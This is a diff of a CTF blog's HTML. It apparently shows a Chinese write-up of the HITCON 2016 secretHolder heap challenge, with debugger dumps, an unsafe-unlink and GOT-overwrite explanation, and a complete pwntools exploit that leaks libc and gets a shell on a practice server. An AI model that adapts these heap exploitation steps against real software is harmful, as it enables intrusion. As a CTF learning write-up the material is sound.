@@ -515,10 +515,10 @@
 <p>unlink后内存布局</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx <span class="number">0x6020b0</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x602098</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000184d010</span></span><br><span class="line"><span class="number">0x6020a8</span>:	<span class="number">0x000000000184d040</span>	<span class="number">0x0000000000602098</span>   #small_ptr</span><br><span class="line"><span class="number">0x6020b8</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x000000000184d010</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x184d000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span>  <span class="meta">#small,big</span></span><br><span class="line"><span class="number">0x184d010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000081ff1</span>  top chunk</span><br><span class="line"><span class="number">0x184d020</span>:	<span class="number">0x0000000000602098</span>	<span class="number">0x00000000006020a0</span></span><br><span class="line"><span class="number">0x184d030</span>:	<span class="number">0x0000000000000020</span>	<span class="number">0x0000000000061a90</span></span><br><span class="line"><span class="number">0x184d040</span>:	<span class="number">0x0000000041414141</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>此时small_ptr指向&amp;small_ptr-3,我们获得了任意地址写的能力，考虑利用one-gadget获得shell，那么首先要泄露libc的内存地址。方法是修改<a href="mailto:&#102;&#114;&#x65;&#101;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#116;">&#102;&#114;&#x65;&#101;&#64;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#116;</a>为puts@plt,修改big_ptr为<a href="mailto:&#112;&#117;&#x74;&#x73;&#x40;&#103;&#x6f;&#x74;&#46;&#112;&#108;&#x74;">&#112;&#117;&#x74;&#x73;&#x40;&#103;&#x6f;&#x74;&#46;&#112;&#108;&#x74;</a>,那么调用free()函数删除big secret时，将打印出puts()的内存地址，通过偏移可得到libc和one-gadget的地址</p>
+<p>此时small_ptr指向&amp;small_ptr-3,我们获得了任意地址写的能力，考虑利用one-gadget获得shell，那么首先要泄露libc的内存地址。方法是修改<a href="mailto:&#102;&#114;&#x65;&#x65;&#x40;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#x74;">&#102;&#114;&#x65;&#x65;&#x40;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#x74;</a>为puts@plt,修改big_ptr为<a href="mailto:&#112;&#117;&#x74;&#x73;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;">&#112;&#117;&#x74;&#x73;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a>,那么调用free()函数删除big secret时，将打印出puts()的内存地址，通过偏移可得到libc和one-gadget的地址</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx <span class="number">0x6020b0</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x602098</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000602020</span>   #big_plt</span><br><span class="line"><span class="number">0x6020a8</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x00000000006020a0</span></span><br><span class="line"><span class="number">0x6020b8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/gx <span class="number">0x602018</span></span><br><span class="line"><span class="number">0x602018</span> &lt;<span class="built_in">free</span>@got.plt&gt;:	<span class="number">0x00000000004006c0</span></span><br><span class="line">pwndbg&gt; x/gx <span class="number">0x00000000004006c0</span></span><br><span class="line"><span class="number">0x4006c0</span> &lt;<span class="built_in">puts</span>@plt&gt;:	<span class="number">0x01680020195a25ff</span></span><br><span class="line">pwndbg&gt; x/gx <span class="number">0x0000000000602020</span></span><br><span class="line"><span class="number">0x602020</span> &lt;<span class="built_in">puts</span>@got.plt&gt;:	<span class="number">0x00007f4070f286a0</span></span><br></pre></td></tr></table></figure>
 
-<p>最后修改<a href="mailto:&#112;&#x75;&#x74;&#x73;&#x40;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;">&#112;&#x75;&#x74;&#x73;&#x40;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;</a>为one-gadget，在下一次调用puts函数时获得shell。</p>
+<p>最后修改<a href="mailto:&#112;&#x75;&#116;&#x73;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;">&#112;&#x75;&#116;&#x73;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;</a>为one-gadget，在下一次调用puts函数时获得shell。</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28595</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./secretHolder_hitcon_2016&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./secretHolder_hitcon_2016&quot;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">small_ptr=<span class="number">0x6020B0</span></span><br><span class="line">big_ptr=<span class="number">0x6020A0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Renew secret\n&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Huge secret\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;secret: \n&quot;</span>, <span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Renew secret\n&quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Huge secret\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Renew secret\n&quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Huge secret\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;secret: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    keep(<span class="number">1</span>)</span><br><span class="line">    wipe(<span class="number">1</span>)</span><br><span class="line">    keep(<span class="number">2</span>)     <span class="comment"># big</span></span><br><span class="line">    wipe(<span class="number">1</span>)     <span class="comment"># double free 释放big secret</span></span><br><span class="line">    keep(<span class="number">1</span>)     <span class="comment"># small # overlapping</span></span><br><span class="line">    keep(<span class="number">3</span>)</span><br><span class="line">    wipe(<span class="number">3</span>)</span><br><span class="line">    keep(<span class="number">3</span>)     <span class="comment"># huge</span></span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)                   <span class="comment"># fake prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x21</span>)                <span class="comment"># fake size</span></span><br><span class="line">    payload += p64(small_ptr - <span class="number">0x18</span>)    <span class="comment"># fake fd</span></span><br><span class="line">    payload += p64(small_ptr - <span class="number">0x10</span>)    <span class="comment"># fake bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)                <span class="comment"># fake prev_size of next</span></span><br><span class="line">    payload += p64(<span class="number">0x61a90</span>)             <span class="comment"># fake size  of next 0x61a90=400016</span></span><br><span class="line">    renew(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">    wipe(<span class="number">3</span>)         <span class="comment"># unsafe unlink</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> one_gadget</span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) <span class="comment"># big_ptr -&gt; free@got.plt</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(big_ptr)         <span class="comment"># small_ptr -&gt; big_ptr</span></span><br><span class="line">    renew(<span class="number">1</span>, payload)</span><br><span class="line">    renew(<span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment"># free@got.plt -&gt; puts@plt</span></span><br><span class="line">    renew(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment"># big_ptr -&gt; puts@got.plt</span></span><br><span class="line"></span><br><span class="line">    wipe(<span class="number">2</span>)</span><br><span class="line">    puts_addr = u64(p.recvline()[:<span class="number">6</span>] + <span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4525a</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;one_gadget address: 0x%x&quot;</span> % one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    payload  = <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># small_ptr -&gt; puts@got.plt</span></span><br><span class="line">    renew(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">    renew(<span class="number">1</span>, p64(one_gadget))       <span class="comment"># puts@got.plt -&gt; one_gadget</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    unlink()</span><br><span class="line">    leak()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
 
 
@@ -824,7 +824,91 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1031,7 +1115,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 28
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -1045,6 +1129,30 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span>
+            <a class="archive-post-title" href="/2022/07/03/0ctf_2018_babystack/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2022/07/02/ret2dlresolve_x64/">ret2dlresolve_x64</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span>
+            <a class="archive-post-title" href="/2022/04/29/dl-runtime-resolve/">ret2dl-resolve</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2022/04/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/">延迟绑定</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">04/22</span>
@@ -1192,6 +1300,18 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
             <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
         </li>
     
@@ -1202,15 +1322,33 @@
         </li>
     
         
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
         <li class="archive-post-item">
-            <span class="archive-post-date">01/08</span>
-            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/04/25/srop/">srop</a>
         </li>
     
         
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
         <li class="archive-post-item">
-            <span class="archive-post-date">01/08</span>
-            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">非栈上的格式化字符串漏洞</a>
         </li>
     
     </div>
@@ -1218,6 +1356,16 @@
 
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="tcache">
+                <span class="iconfont-archer">&#xe606;</span>
+                tcache
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
         
             <span class="sidebar-tag-name" data-tags="unsorted bin attack">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -1237,16 +1385,6 @@
             <span class="sidebar-tag-name" data-tags="fastbin doule free">
                 <span class="iconfont-archer">&#xe606;</span>
                 fastbin doule free
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="tcache">
-                <span class="iconfont-archer">&#xe606;</span>
-                tcache
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
             </span>
         
     </div>
